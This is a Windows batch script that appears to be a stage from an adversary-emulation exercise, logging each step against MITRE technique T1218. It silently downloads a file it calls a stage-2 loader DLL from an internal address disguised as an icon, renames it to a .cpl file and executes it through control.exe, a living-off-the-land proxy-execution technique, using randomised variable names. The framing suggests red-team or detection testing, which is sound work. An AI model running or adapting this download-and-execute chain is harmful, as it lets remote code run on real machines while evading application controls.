@echo off
setlocal enabledelayedexpansion

REM ── SET variable preamble ──────────────────────────────────────────────────
SET bvkrwx=BALAM-S2B
SET qlzmdt=7
SET fnjpcs=%APPDATA%\7\macula-simulations.log
SET hwotgr=%APPDATA%\10370\2bfa0da5
SET ydxmkl=0789f1fc.txt
SET cepqzv=10370
SET tnrjwb=https://10.0.0.49/stage/2/icon.png?10370-7
SET ugxfpl=%APPDATA%\7

REM ── Cache timestamp once at script start ───────────────────────────────────
SET tsvar=!DATE!/!TIME!

REM ── Initialise log file (append mode, suppress IO errors) ─────────────────
echo [!tsvar!][DEBUG][!bvkrwx!][!cepqzv!]: script_start>> "!fnjpcs!" 2>nul

REM ── Heartbeat fetch — downloads Stage 2 Loader DLL to disk ────────────────
echo [!tsvar!][DEBUG][!bvkrwx!][!cepqzv!]: heartbeat_start>> "!fnjpcs!" 2>nul

curl -k -s -o "!hwotgr!\!ydxmkl!" "!tnrjwb!"

SET tsvar=!DATE!/!TIME!
echo [!tsvar!][DEBUG][!bvkrwx!][!cepqzv!]: heartbeat_complete=!ERRORLEVEL!>> "!fnjpcs!" 2>nul

REM ── Change working directory to output location ───────────────────────────
SET tsvar=!DATE!/!TIME!
echo [!tsvar!][DEBUG][!bvkrwx!][!cepqzv!]: chdir_start>> "!fnjpcs!" 2>nul

cd /d "!hwotgr!" >nul 2>&1
SET _cdresult=!ERRORLEVEL!

SET tsvar=!DATE!/!TIME!
echo [!tsvar!][DEBUG][!bvkrwx!][!cepqzv!]: chdir_result=!_cdresult!>> "!fnjpcs!" 2>nul

REM ── Rename downloaded Loader DLL to CPL extension for control.exe proxy ───
SET tsvar=!DATE!/!TIME!
echo [!tsvar!][DEBUG][!bvkrwx!][!cepqzv!]: rename_start>> "!fnjpcs!" 2>nul

rename "!hwotgr!\!ydxmkl!" file.cpl >nul 2>&1
SET _renresult=!ERRORLEVEL!

SET tsvar=!DATE!/!TIME!
echo [!tsvar!][DEBUG][!bvkrwx!][!cepqzv!]: rename_result=!_renresult!>> "!fnjpcs!" 2>nul

REM ── T1218 — System Binary Proxy Execution via control.exe (LOLBIN) ─────────
REM    control.exe loads the CPL file and calls its CPlApplet export
SET tsvar=!DATE!/!TIME!
echo [!tsvar!][DEBUG][!bvkrwx!][!cepqzv!]: lolbin_start>> "!fnjpcs!" 2>nul

control.exe file.cpl
SET _lolresult=!ERRORLEVEL!

SET tsvar=!DATE!/!TIME!
echo [!tsvar!][DEBUG][!bvkrwx!][!cepqzv!]: lolbin_result=!_lolresult!>> "!fnjpcs!" 2>nul

REM ── Per-TTP log line — T1218 System Binary Proxy Execution ────────────────
IF !_lolresult! EQU 0 (
    echo [!tsvar!][TTP][!bvkrwx!][!cepqzv!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!fnjpcs!" 2>nul
) ELSE (
    echo [!tsvar!][TTP][!bvkrwx!][!cepqzv!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!fnjpcs!" 2>nul
)

SET tsvar=!DATE!/!TIME!
echo [!tsvar!][DEBUG][!bvkrwx!][!cepqzv!]: script_end>> "!fnjpcs!" 2>nul

endlocal